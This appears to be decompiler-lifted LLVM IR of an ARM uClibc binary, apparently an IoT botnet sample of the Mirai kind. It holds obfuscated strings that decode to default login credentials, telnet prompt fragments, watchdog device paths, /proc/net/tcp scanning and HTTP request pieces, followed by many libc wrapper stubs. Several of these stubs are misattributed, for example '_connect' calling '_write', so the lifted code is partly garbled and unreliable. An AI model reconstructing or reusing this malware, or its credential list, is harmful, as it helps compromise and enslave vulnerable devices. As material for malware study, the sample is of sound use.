source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%__dirstream = type { i32 }
%_TYPEDEF_sigset_t = type { [1 x i32] }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_1cbc8.2 = global i32 1
@global_var_1cc60.3 = global i32* @global_var_1cbc8.2
@global_var_1cc68.4 = global i32 0
@global_var_1ccd4.31 = global i32 35716
@global_var_1ccd8.32 = global i32 35716
@global_var_1ccdc.33 = global i32 35716
@global_var_1cce0.34 = global i32 35716
@global_var_1cce4.35 = global i32 35716
@global_var_1cce8.36 = global i32 35716
@global_var_1ccec.37 = global i32 35716
@global_var_1ccf0.38 = global i32 35716
@global_var_1ccf4.39 = global i32 35716
@global_var_1ccf8.40 = global i32 35716
@global_var_1ccfc.41 = global i32 35716
@global_var_1cd00.42 = global i32 35716
@global_var_1cd04.43 = global i32 35716
@global_var_1cd08.44 = global i32 35716
@global_var_1cd10.46 = global i32 35716
@global_var_1cd14.47 = global i32 35716
@global_var_1cd18.48 = global i32 35716
@global_var_1cd1c.49 = global i32 35716
@global_var_1cd20.50 = global i32 35716
@global_var_1cd24.51 = global i32 35716
@global_var_1cd28.52 = global i32 35716
@global_var_1cd2c.53 = global i32 35716
@global_var_1cd30.54 = global i32 35716
@global_var_1cd34.55 = global i32 35716
@global_var_1cd38.56 = global i32 35716
@global_var_1cbc0.60 = global i32 0
@global_var_1cd44.61 = global i32* @global_var_1cbc0.60
@global_var_1cd64.67 = global i32 0
@global_var_101d8.73 = constant i32 -382906384
@global_var_143b4.76 = constant [4 x i8] c"GET\00"
@global_var_143b8.78 = constant i32 47
@global_var_ff00.79 = constant i32 -476053492
@global_var_8dcc.81 = constant i32 -493894144
@global_var_143ac.83 = constant i32 32
@global_var_14384.85 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1439c.87 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_143a8.89 = constant [3 x i8] c"\0D\0A\00"
@global_var_143bc.91 = constant [9 x i8] c"Cookie: \00"
@global_var_143c8.93 = constant [3 x i8] c"; \00"
@global_var_143cc.95 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_143d4.97 = constant i32 59
@global_var_143d8.99 = constant [5 x i8] c"http\00"
@global_var_143e0.101 = constant [5 x i8] c"url=\00"
@global_var_143e8.103 = constant [5 x i8] c"POST\00"
@global_var_13a7c.104 = constant i32 -439275520
@global_var_143f0.106 = constant i32 39
@global_var_143f4.108 = constant i32 61
@global_var_1cd80.112 = global i32 0
@global_var_ae24.113 = constant i32 -352321546
@global_var_8de4.114 = constant i32 -493894144
@global_var_1cd84.116 = global i32 0
@global_var_1cd88.117 = local_unnamed_addr global i32 0
@global_var_e528.123 = constant i32 -382906384
@global_var_e9ec.125 = constant i32 -382906384
@global_var_dbb4.127 = constant i32 -382906384
@global_var_d470.129 = constant i32 -382906384
@global_var_ccfc.131 = constant i32 -382906384
@global_var_c480.133 = constant i32 -382906384
@global_var_bd64.135 = constant i32 -382906384
@global_var_b5e8.137 = constant i32 -382906384
@global_var_8f24.139 = constant i32 -382906384
@global_var_1cdf4.141 = global i32 0
@global_var_1cdfc.152 = global i32 0
@global_var_143f8.154 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_1cda4.158 = global i32 0
@global_var_1cdf8.160 = global i32 0
@global_var_10148.162 = constant i32 -382910352
@global_var_1cd54.164 = global i32 81164
@global_var_1cd4c.166 = global i32 -1
@global_var_1ce04.172 = local_unnamed_addr global i32 0
@global_var_1ce03.173 = local_unnamed_addr global i32 0
@global_var_1ce02.174 = local_unnamed_addr global i32 0
@global_var_14408.178 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1ce01.183 = local_unnamed_addr global i32 0
@global_var_1445c.185 = constant [3 x i8] c"/.\00"
@global_var_14438.187 = constant i32 65496
@global_var_ffd8.188 = constant i32 -382909968
@global_var_13128.190 = constant i32 -509607552
@global_var_131e0.193 = constant i32 -382906384
@global_var_13070.195 = constant i32 -509607552
@global_var_14458.200 = constant i32 65472
@global_var_1442c.202 = constant i32 10
@global_var_14418.204 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1cd50.206 = global i32 -1
@global_var_13d0c.211 = constant i32 -382910224
@global_var_14430.213 = constant i32 16777216
@global_var_1cdac.215 = global i32 0
@global_var_1cdb8.217 = global i32 0
@global_var_1cdb0.219 = global i32 0
@global_var_1cdb4.221 = global i32 0
@global_var_14470.227 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_11314.236 = constant i32 -442695668
@global_var_1ce18.238 = global i32 0
@global_var_1cdf0.240 = global i32 0
@global_var_1cdbc.242 = global i32 0
@global_var_1cde8.244 = global i32 0
@global_var_1ce10.252 = global i32 0
@global_var_1ce14.254 = global i32 0
@global_var_1cdc0.256 = global i32 0
@global_var_1cdc3.257 = local_unnamed_addr global i32 0
@global_var_1cdc2.258 = local_unnamed_addr global i32 0
@global_var_1cdd4.260 = global i32 0
@global_var_1cdc8.262 = local_unnamed_addr global i32 0
@global_var_1cdc5.263 = local_unnamed_addr global i32 0
@global_var_1cdd5.264 = local_unnamed_addr global i32 0
@global_var_1cdd7.265 = local_unnamed_addr global i32 0
@global_var_1cdc9.266 = local_unnamed_addr global i32 0
@global_var_1cdc4.267 = local_unnamed_addr global i32 0
@global_var_1cdd6.268 = local_unnamed_addr global i32 0
@global_var_1cde3.270 = local_unnamed_addr global i32 0
@global_var_1cde2.271 = local_unnamed_addr global i32 0
@global_var_1464c.273 = constant [5 x i8] c"PMMV\00"
@global_var_143d0.275 = constant i32 0
@global_var_14494.277 = constant [6 x i8] c"CFOKL\00"
@global_var_1449c.279 = constant i32 387006810
@global_var_144a4.281 = constant [6 x i8] c"TKXZT\00"
@global_var_144ac.283 = constant i32 437918234
@global_var_144b4.285 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_144bc.287 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_144c8.289 = constant i32 370216979
@global_var_144d0.291 = constant i32 269555223
@global_var_144d8.293 = constant [8 x i8] c"FGDCWNV\00"
@global_var_144e0.295 = constant [8 x i8] c"QWRRMPV\00"
@global_var_144e8.297 = constant i32 370216979
@global_var_144f0.299 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_144fc.301 = constant i32 370216979
@global_var_14504.303 = constant [5 x i8] c"WQGP\00"
@global_var_1450c.305 = constant i32 1263486531
@global_var_145b0.307 = constant i32 320017171
@global_var_14518.309 = constant [9 x i8] c"QOACFOKL\00"
@global_var_14524.311 = constant i32 336860180
@global_var_1452c.313 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_1453c.315 = constant [8 x i8] c"QGPTKAG\00"
@global_var_14544.317 = constant [6 x i8] c"EWGQV\00"
@global_var_1454c.319 = constant [5 x i8] c"W@LV\00"
@global_var_14554.321 = constant i32 324420417
@global_var_14560.323 = constant i32 390551160
@global_var_14568.325 = constant [6 x i8] c"HT@XF\00"
@global_var_14570.327 = constant [5 x i8] c"CLIM\00"
@global_var_14578.329 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_14580.331 = constant i32 303174162
@global_var_14588.333 = constant i32 1867011861
@global_var_14598.335 = constant i32 1263486531
@global_var_145a4.337 = constant [5 x i8] c"RCQQ\00"
@global_var_144c0.339 = constant [5 x i8] c"VGAJ\00"
@global_var_145ac.341 = constant i32 320017171
@global_var_145b8.343 = constant i32 323043395
@global_var_145c0.345 = constant i32 1118227
@global_var_145c4.347 = constant i32 370216979
@global_var_145cc.349 = constant [4 x i8] c"CFO\00"
@global_var_145d0.351 = constant i32 1263421261
@global_var_145dc.353 = constant [7 x i8] c"QUKVAJ\00"
@global_var_145e4.355 = constant [7 x i8] c"VGNLGV\00"
@global_var_145ec.357 = constant i32 370216979
@global_var_145f8.359 = constant i32 370216979
@global_var_14604.361 = constant [7 x i8] c"FCGOML\00"
@global_var_1460c.363 = constant i32 387007823
@global_var_14614.365 = constant [7 x i8] c"OGPNKL\00"
@global_var_1461c.367 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_14628.369 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_1cdcc.370 = local_unnamed_addr global i32 0
@global_var_1cdca.372 = local_unnamed_addr global i32 0
@global_var_1cdcb.373 = local_unnamed_addr global i32 0
@global_var_1cde4.375 = local_unnamed_addr global i32 0
@global_var_1cde5.376 = local_unnamed_addr global i32 0
@global_var_14634.381 = constant [5 x i8] c"ogin\00"
@global_var_1463c.383 = constant [6 x i8] c"enter\00"
@global_var_1465a.387 = constant i32 2096127
@global_var_14651.389 = constant i32 2095871
@global_var_14644.391 = constant [8 x i8] c"assword\00"
@global_var_1ce20.393 = global i32 0
@global_var_1cd5c.396 = global i32 -559038737
@global_var_14660.400 = constant [19 x i8] c"RKAGQVJGEMCVEE\0CON\22\00"
@global_var_1ce3c.402 = local_unnamed_addr global i32 0
@global_var_1ce38.403 = local_unnamed_addr global i32 0
@global_var_1ce3d.404 = local_unnamed_addr global i32 0
@global_var_14674.406 = constant [3 x i8] c"\225\00"
@global_var_1ce40.407 = local_unnamed_addr global i32 0
@global_var_1ce44.408 = local_unnamed_addr global i32 0
@global_var_1ce45.409 = local_unnamed_addr global i32 0
@global_var_1ceb4.410 = local_unnamed_addr global i32 0
@global_var_1ceb0.411 = local_unnamed_addr global i32 0
@global_var_1ceb5.412 = local_unnamed_addr global i32 0
@global_var_14678.414 = constant i32 51097
@global_var_1ceb8.415 = local_unnamed_addr global i32 0
@global_var_1cebc.416 = local_unnamed_addr global i32 0
@global_var_1cebd.417 = local_unnamed_addr global i32 0
@global_var_1467c.419 = constant i32 1448168270
@global_var_1ce34.420 = local_unnamed_addr global i32 0
@global_var_1ce30.421 = local_unnamed_addr global i32 0
@global_var_1ce35.422 = local_unnamed_addr global i32 0
@global_var_1468c.424 = constant i32 1381389898
@global_var_1ce4c.425 = local_unnamed_addr global i32 0
@global_var_1ce48.426 = local_unnamed_addr global i32 0
@global_var_1ce4d.427 = local_unnamed_addr global i32 0
@global_var_146ac.429 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1ce50.430 = local_unnamed_addr global i32 0
@global_var_1ce54.431 = local_unnamed_addr global i32 0
@global_var_1ce55.432 = local_unnamed_addr global i32 0
@global_var_146b4.434 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1ce5c.435 = local_unnamed_addr global i32 0
@global_var_1ce58.436 = local_unnamed_addr global i32 0
@global_var_1ce5d.437 = local_unnamed_addr global i32 0
@global_var_146bc.439 = constant i32 1195772418
@global_var_1ce64.440 = local_unnamed_addr global i32 0
@global_var_1ce60.441 = local_unnamed_addr global i32 0
@global_var_1ce65.442 = local_unnamed_addr global i32 0
@global_var_146c8.444 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1ce6c.445 = local_unnamed_addr global i32 0
@global_var_1ce68.446 = local_unnamed_addr global i32 0
@global_var_1ce6d.447 = local_unnamed_addr global i32 0
@global_var_146d0.449 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1ce70.450 = local_unnamed_addr global i32 0
@global_var_1ce74.451 = local_unnamed_addr global i32 0
@global_var_1ce75.452 = local_unnamed_addr global i32 0
@global_var_146d8.454 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1ce7c.455 = local_unnamed_addr global i32 0
@global_var_1ce78.456 = local_unnamed_addr global i32 0
@global_var_1ce7d.457 = local_unnamed_addr global i32 0
@global_var_146e4.459 = constant i32 1836214128
@global_var_1ce84.460 = local_unnamed_addr global i32 0
@global_var_1ce80.461 = local_unnamed_addr global i32 0
@global_var_1ce85.462 = local_unnamed_addr global i32 0
@global_var_146f4.464 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1ce88.465 = local_unnamed_addr global i32 0
@global_var_1ce8c.466 = local_unnamed_addr global i32 0
@global_var_1ce8d.467 = local_unnamed_addr global i32 0
@global_var_14700.469 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1ce90.470 = local_unnamed_addr global i32 0
@global_var_1ce94.471 = local_unnamed_addr global i32 0
@global_var_1ce95.472 = local_unnamed_addr global i32 0
@global_var_1470c.474 = constant i32 437738110
@global_var_1ce9c.475 = local_unnamed_addr global i32 0
@global_var_1ce98.476 = local_unnamed_addr global i32 0
@global_var_1ce9d.477 = local_unnamed_addr global i32 0
@global_var_14730.479 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1cea4.480 = local_unnamed_addr global i32 0
@global_var_1cea0.481 = local_unnamed_addr global i32 0
@global_var_1cea5.482 = local_unnamed_addr global i32 0
@global_var_1473c.484 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1ceac.485 = local_unnamed_addr global i32 0
@global_var_1cea8.486 = local_unnamed_addr global i32 0
@global_var_1cead.487 = local_unnamed_addr global i32 0
@global_var_14748.489 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1cec4.490 = local_unnamed_addr global i32 0
@global_var_1cec0.491 = local_unnamed_addr global i32 0
@global_var_1cec5.492 = local_unnamed_addr global i32 0
@global_var_14750.494 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1cec8.495 = local_unnamed_addr global i32 0
@global_var_1cecc.496 = local_unnamed_addr global i32 0
@global_var_1cecd.497 = local_unnamed_addr global i32 0
@global_var_14758.499 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1ced0.500 = local_unnamed_addr global i32 0
@global_var_1ced4.501 = local_unnamed_addr global i32 0
@global_var_1ced5.502 = local_unnamed_addr global i32 0
@global_var_14760.504 = constant [4 x i8] c"QJ\22\00"
@global_var_1cedc.505 = local_unnamed_addr global i32 0
@global_var_1ced8.506 = local_unnamed_addr global i32 0
@global_var_1cedd.507 = local_unnamed_addr global i32 0
@global_var_14764.509 = constant i32 1280000013
@global_var_1cee0.510 = local_unnamed_addr global i32 0
@global_var_1cee4.511 = local_unnamed_addr global i32 0
@global_var_1cee5.512 = local_unnamed_addr global i32 0
@global_var_14778.514 = constant i32 1668311919
@global_var_1ceec.515 = local_unnamed_addr global i32 0
@global_var_1cee8.516 = local_unnamed_addr global i32 0
@global_var_1ceed.517 = local_unnamed_addr global i32 0
@global_var_14794.519 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1cef0.520 = local_unnamed_addr global i32 0
@global_var_1cef4.521 = local_unnamed_addr global i32 0
@global_var_1cef5.522 = local_unnamed_addr global i32 0
@global_var_147a0.524 = constant i32 1280000013
@global_var_1cef8.525 = local_unnamed_addr global i32 0
@global_var_1cefc.526 = local_unnamed_addr global i32 0
@global_var_1cefd.527 = local_unnamed_addr global i32 0
@global_var_147b4.529 = constant i32 1280000013
@global_var_1cf04.530 = local_unnamed_addr global i32 0
@global_var_1cf00.531 = local_unnamed_addr global i32 0
@global_var_1cf05.532 = local_unnamed_addr global i32 0
@global_var_147cc.534 = constant i32 1464693110
@global_var_1cf0c.535 = local_unnamed_addr global i32 0
@global_var_1cf08.536 = local_unnamed_addr global i32 0
@global_var_1cf0d.537 = local_unnamed_addr global i32 0
@global_var_147e4.539 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1cf14.540 = local_unnamed_addr global i32 0
@global_var_1cf10.541 = local_unnamed_addr global i32 0
@global_var_1cf15.542 = local_unnamed_addr global i32 0
@global_var_147f8.544 = constant i32 1196376908
@global_var_1cf18.545 = local_unnamed_addr global i32 0
@global_var_1cf1c.546 = local_unnamed_addr global i32 0
@global_var_1cf1d.547 = local_unnamed_addr global i32 0
@global_var_14808.549 = constant i32 1280068961
@global_var_1cf24.550 = local_unnamed_addr global i32 0
@global_var_1cf20.551 = local_unnamed_addr global i32 0
@global_var_1cf25.552 = local_unnamed_addr global i32 0
@global_var_14820.554 = constant i32 1195458915
@global_var_1cf2c.555 = local_unnamed_addr global i32 0
@global_var_1cf28.556 = local_unnamed_addr global i32 0
@global_var_1cf2d.557 = local_unnamed_addr global i32 0
@global_var_14874.559 = constant i32 1195458915
@global_var_1cf34.560 = local_unnamed_addr global i32 0
@global_var_1cf30.561 = local_unnamed_addr global i32 0
@global_var_1cf35.562 = local_unnamed_addr global i32 0
@global_var_14898.564 = constant i32 1447841121
@global_var_1cf3c.565 = local_unnamed_addr global i32 0
@global_var_1cf38.566 = local_unnamed_addr global i32 0
@global_var_1cf3d.567 = local_unnamed_addr global i32 0
@global_var_148cc.569 = constant i32 1633044305
@global_var_1cf40.570 = local_unnamed_addr global i32 0
@global_var_1cf44.571 = local_unnamed_addr global i32 0
@global_var_1cf45.572 = local_unnamed_addr global i32 0
@global_var_148dc.574 = constant i32 1346651984
@global_var_1cf48.575 = local_unnamed_addr global i32 0
@global_var_1cf4c.576 = local_unnamed_addr global i32 0
@global_var_1cf4d.577 = local_unnamed_addr global i32 0
@global_var_148e8.579 = constant i32 1128353102
@global_var_1cf50.580 = local_unnamed_addr global i32 0
@global_var_1cf54.581 = local_unnamed_addr global i32 0
@global_var_1cf55.582 = local_unnamed_addr global i32 0
@global_var_148f4.584 = constant i32 257312593
@global_var_1cf58.585 = local_unnamed_addr global i32 0
@global_var_1cf5c.586 = local_unnamed_addr global i32 0
@global_var_1cf5d.587 = local_unnamed_addr global i32 0
@global_var_14904.589 = constant i32 1447841089
@global_var_1cf60.590 = local_unnamed_addr global i32 0
@global_var_1cf64.591 = local_unnamed_addr global i32 0
@global_var_1cf65.592 = local_unnamed_addr global i32 0
@global_var_14918.594 = constant i32 1279479894
@global_var_1cf68.595 = local_unnamed_addr global i32 0
@global_var_1cf6c.596 = local_unnamed_addr global i32 0
@global_var_1cf6d.597 = local_unnamed_addr global i32 0
@global_var_1492c.599 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1cf74.600 = local_unnamed_addr global i32 0
@global_var_1cf70.601 = local_unnamed_addr global i32 0
@global_var_1cf75.602 = local_unnamed_addr global i32 0
@global_var_14814.604 = constant i32 1380403017
@global_var_1cf7c.605 = local_unnamed_addr global i32 0
@global_var_1cf78.606 = local_unnamed_addr global i32 0
@global_var_1cf7d.607 = local_unnamed_addr global i32 0
@global_var_14938.609 = constant i32 1280068929
@global_var_1cf80.610 = local_unnamed_addr global i32 0
@global_var_1cf84.611 = local_unnamed_addr global i32 0
@global_var_1cf85.612 = local_unnamed_addr global i32 0
@global_var_14948.614 = constant i32 1414547281
@global_var_1cf8c.615 = local_unnamed_addr global i32 0
@global_var_1cf88.616 = local_unnamed_addr global i32 0
@global_var_1cf8d.617 = local_unnamed_addr global i32 0
@global_var_1495c.619 = constant i32 1414547281
@global_var_1cf94.620 = local_unnamed_addr global i32 0
@global_var_1cf90.621 = local_unnamed_addr global i32 0
@global_var_1cf95.622 = local_unnamed_addr global i32 0
@global_var_14978.624 = constant i32 1264078191
@global_var_1cf98.625 = local_unnamed_addr global i32 0
@global_var_1cf9c.626 = local_unnamed_addr global i32 0
@global_var_1cf9d.627 = local_unnamed_addr global i32 0
@global_var_149e8.629 = constant i32 1264078191
@global_var_1cfa0.630 = local_unnamed_addr global i32 0
@global_var_1cfa4.631 = local_unnamed_addr global i32 0
@global_var_1cfa5.632 = local_unnamed_addr global i32 0
@global_var_14a58.634 = constant i32 1264078191
@global_var_1cfa8.635 = local_unnamed_addr global i32 0
@global_var_1cfac.636 = local_unnamed_addr global i32 0
@global_var_1cfad.637 = local_unnamed_addr global i32 0
@global_var_14ac8.639 = constant i32 1264078191
@global_var_1cfb4.640 = local_unnamed_addr global i32 0
@global_var_1cfb0.641 = local_unnamed_addr global i32 0
@global_var_1cfb5.642 = local_unnamed_addr global i32 0
@global_var_14b38.644 = constant i32 1264078191
@global_var_1cfb8.645 = local_unnamed_addr global i32 0
@global_var_1cfbc.646 = local_unnamed_addr global i32 0
@global_var_1cbb8.648 = global i32 0
@global_var_1cbb4.649 = global i32 -1
@global_var_1cd60.58 = external global i8*
@global_var_1cd7c.110 = external global i8*
@global_var_1cd7d.121 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1cd58.168 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1ce00.171 = external global i8*
@global_var_ffc0.176 = constant void (i32)* inttoptr (i32 -442556408 to void (i32)*)
@global_var_1cda8.209 = external global i8*
@global_var_1cdec.246 = external global i8*
@global_var_1cded.247 = local_unnamed_addr global i8 0
@global_var_1cde0.261 = local_unnamed_addr global i8 0
@global_var_1cde1.269 = local_unnamed_addr global i8 0
@global_var_1cdd8.374 = local_unnamed_addr global i8 0
@global_var_1cdd0.371 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8b6c() local_unnamed_addr {
entry:
  %v3_8b70 = load i32, i32* @r4, align 4
  %v0_8b78 = call i32 @function_8e88()
  store i32 %v0_8b78, i32* @r0, align 4
  %v1_8b7c = call i32 @function_14324(i32 %v0_8b78)
  call void @__pseudo_branch(i32 %v3_8b70)
  ret i32 %v1_8b7c
}

define i32 @function_8b84(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8b90 = load i32, i32* @global_var_1cc68.4, align 4
  call void @__pseudo_branch(i32 %v3_8b90)
  %v0_8b94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8b94, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v7_8b94 = load i32, i32* @r0, align 4
  ret i32 %v7_8b94

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_ioctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8ba0 = call i32 @unknown_e28cca14()
  ret i32 %v4_8ba0
}

define i32 @_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8bac = call i32 @unknown_e5bcf034()
  ret i32 %v4_8bac
}

define i32 @_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bb8 = call i32 @_write()
  ret i32 %v4_8bb8
}

define i32 @_sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bc4 = call i32 @unknown_e28cca14()
  ret i32 %v4_8bc4
}

define i32 @_memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bd0 = call i32 @unknown_e5bcf02c()
  ret i32 %v4_8bd0
}

define i32 @_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8bdc = call i32 @_kill()
  ret i32 %v4_8bdc
}

define i32 @_prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8be8 = call i32 @unknown_e28cca14()
  ret i32 %v4_8be8
}

define i32 @_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8bf4 = call i32 @unknown_e5bcf024()
  ret i32 %v4_8bf4
}

define i32 @_readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8c00 = call i32 @_bind()
  ret i32 %v4_8c00
}

define i32 @_malloc(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c0c = call i32 @unknown_e28cca14()
  ret i32 %v4_8c0c
}

define i32 @_sleep(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c18 = call i32 @unknown_e5bcf01c()
  ret i32 %v4_8c18
}

define i32 @_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v4_8c24 = call i32 @_inet_addr()
  ret i32 %v4_8c24
}

define i32 @_socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8c30 = call i32 @unknown_e28cca14()
  ret i32 %v4_8c30
}

define i32 @_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8c3c = call i32 @unknown_e5bcf014()
  ret i32 %v4_8c3c
}

define i32 @_readdir(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c48 = call i32 @_chdir()
  ret i32 %v4_8c48
}

define i32 @_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8c54 = call i32 @unknown_e28cca14()
  ret i32 %v4_8c54
}

define i32 @_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8c60 = call i32 @unknown_e5bcf00c()
  ret i32 %v4_8c60
}

define i32 @_abort(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8c6c = call i32 @_setsockopt()
  ret i32 %v4_8c6c
}

define i32 @_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v4_8c78 = call i32 @unknown_e28cca14()
  ret i32 %v4_8c78

; uselistorder directives
  uselistorder i32 ()* @unknown_e28cca14, { 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @_calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8c84 = call i32 @unknown_e5bcf004()
  ret i32 %v4_8c84
}

define i32 @_write() local_unnamed_addr {
entry:
  %v4_8c90 = load i32, i32* @r0, align 4
  %v5_8c90 = load i32, i32* @r1, align 4
  %v6_8c90 = inttoptr i32 %v5_8c90 to void (i32)*
  %v7_8c90 = call void (i32)* @signal(i32 %v4_8c90, void (i32)* %v6_8c90)
  %v9_8c90 = ptrtoint void (i32)* %v7_8c90 to i32
  store i32 36048, i32* @ip, align 4
  ret i32 %v9_8c90
}

define i32 @_kill() local_unnamed_addr {
entry:
  %v4_8c9c = call i32 @unknown_e28cca13()
  store i32 36052, i32* @ip, align 4
  ret i32 %v4_8c9c
}

define i32 @_bind() local_unnamed_addr {
entry:
  %v4_8ca8 = call i32 @unknown_e5bcfffc()
  store i32 36056, i32* @ip, align 4
  ret i32 %v4_8ca8
}

define i32 @_inet_addr() local_unnamed_addr {
entry:
  %v4_8cb4 = load i32, i32* @r0, align 4
  %v5_8cb4 = load i32, i32* @r1, align 4
  %v6_8cb4 = load i32, i32* @r2, align 4
  %v7_8cb4 = inttoptr i32 %v5_8cb4 to i32*
  %v8_8cb4 = call i32 @read(i32 %v4_8cb4, i32* %v7_8cb4, i32 %v6_8cb4)
  store i32 36060, i32* @ip, align 4
  ret i32 %v8_8cb4
}

define i32 @_chdir() local_unnamed_addr {
entry:
  %v4_8cc0 = call i32 @unknown_e28cca13()
  store i32 36064, i32* @ip, align 4
  ret i32 %v4_8cc0

; uselistorder directives
  uselistorder i32 ()* @unknown_e28cca13, { 1, 0 }
}

define i32 @_setsockopt() local_unnamed_addr {
entry:
  %v4_8ccc = call i32 @unknown_e5bcfff4()
  store i32 36068, i32* @ip, align 4
  ret i32 %v4_8ccc
}

define void (i32)* @_signal(i32 %sig, void (i32)* %handler) local_unnamed_addr {
entry:
  %v7_8cd8 = call void (i32)* @signal(i32 %sig, void (i32)* %handler)
  ret void (i32)* %v7_8cd8
}

define i32 @_read(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
entry:
  %v8_8ce4 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes)
  ret i32 %v8_8ce4
}

define i32 @_unlink(i8* %name) local_unnamed_addr {
entry:
  %v6_8cf0 = call i32 @unlink(i8* %name)
  ret i32 %v6_8cf0
}

define i32 @_sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len) local_unnamed_addr {
entry:
  %v11_8cfc = call i32 @sendto(i32 %fd, i32* %buf, i32 %n, i32 %flags, %sockaddr* %addr, i32 %addr_len)
  ret i32 %v11_8cfc
}

define i32* @_realloc(i32* %ptr, i32 %size) local_unnamed_addr {
entry:
  %v7_8d08 = call i32* @realloc(i32* %ptr, i32 %size)
  ret i32* %v7_8d08
}

define i32 @_listen(i32 %fd, i32 %n) local_unnamed_addr {
entry:
  %v6_8d14 = call i32 @listen(i32 %fd, i32 %n)
  ret i32 %v6_8d14
}

define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8d20 = call i32 @fork()
  ret i32 %v4_8d20
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8d2c = call i32 @__uClibc_main()
  ret i32 %v4_8d2c
}

define i32* @_memset(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
entry:
  %v8_8d38 = call i32* @memset(i32* %s, i32 %c, i32 %n)
  ret i32* %v8_8d38
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8d44 = call i32 @getppid()
  ret i32 %v4_8d44
}

define i32 @_time(i32* %timer) local_unnamed_addr {
entry:
  %v6_8d50 = call i32 @time(i32* %timer)
  ret i32 %v6_8d50
}

define %__dirstream* @_opendir(i8* %name) local_unnamed_addr {
entry:
  %v6_8d5c = call %__dirstream* @opendir(i8* %name)
  ret %__dirstream* %v6_8d5c
}

